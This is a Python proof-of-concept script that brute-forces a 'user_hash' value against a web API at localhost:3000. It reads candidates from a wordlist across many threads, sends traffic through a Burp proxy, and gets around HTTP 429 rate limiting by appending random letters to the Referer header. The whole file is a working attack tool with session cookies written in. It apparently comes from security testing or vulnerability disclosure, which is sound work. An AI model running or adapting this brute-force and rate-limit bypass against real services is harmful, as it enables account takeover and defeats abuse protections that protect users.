#!/usr/bin/python3
import requests
import threading
import sys
import random
from string import ascii_lowercase


wordlist_fd = open("hashes-wordlist.txt", "r")
hash_found = False


def main(threads = 10):
    # request headers
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Referer": "http://localhost:3000/profile",
        "Content-Type": "application/json",
        "Cookie": "auth=6f5768c7c95e2454ef4a9a5c2df47b1c9d930f25a45df4912019e2c96f62dee7; user_hash=04b829dd0ac626aba079837753ecd25b3e58b2808d8076926c30d5aaa720ac70"
    }

    # generate threads
    for _ in range(threads):
        thread = threading.Thread(target = poc, args = (headers,))
        thread.start()

def poc(headers):
    while True:
        # get global vairalbles
        global wordlist_fd
        global hash_found

        # read one hash from the wordlist
        user_hash = wordlist_fd.readline().strip()

        # check for EOF (end of file) or if the hash is already found
        # if EOF or hash is already found, kill all remaining threads
        if user_hash == "" or hash_found:
            break

        # platform url
        url = "http://localhost:3000/api/user"

        # proxy request through burpsuite
        proxies = {"http": "http://127.0.0.1:8080"}

        # user hash
        json = {"user_hash": user_hash}
        # send the request
        res = requests.post(url, headers = headers, json = json, proxies = proxies)

        # print response status code
        # print(res.status_code)

        # check for rate-limiting
        if res.status_code == 429:
            # bypass rate-limiting by modifying the Referer header
            headers["Referer"] = headers["Referer"] + random.choice(ascii_lowercase)
            # send the request again to make sure the hash is used
            res = requests.post(url, headers = headers, json = json)

        # check for the valid hash
        if res.status_code == 200:
            print("[+] valid user hash -> [{}]".format(user_hash))
            hash_found = True


if __name__ == "__main__":
    if len(sys.argv) == 2:
        main(int(sys.argv[1]))
    else:
        print("usage: ./poc.py <number-of-threads> (default is 10)")